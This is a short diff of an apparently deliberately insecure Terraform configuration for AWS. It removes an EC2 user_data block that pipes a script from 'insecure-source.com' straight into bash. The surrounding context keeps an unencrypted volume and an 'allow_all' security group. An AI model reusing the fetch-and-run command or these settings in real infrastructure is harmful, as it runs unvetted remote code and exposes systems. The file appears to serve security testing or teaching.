@@ -16,12 +16,6 @@ resource "aws_instance" "insecure_ec2" {
     volume_type = "gp2"
     encrypted   = false
   }
-
-  # User data executes script from the internet
-  user_data = <<-EOF
-              #!/bin/bash
-              curl http://insecure-source.com/install.sh | bash
-              EOF
 }
 
 resource "aws_security_group" "allow_all" {
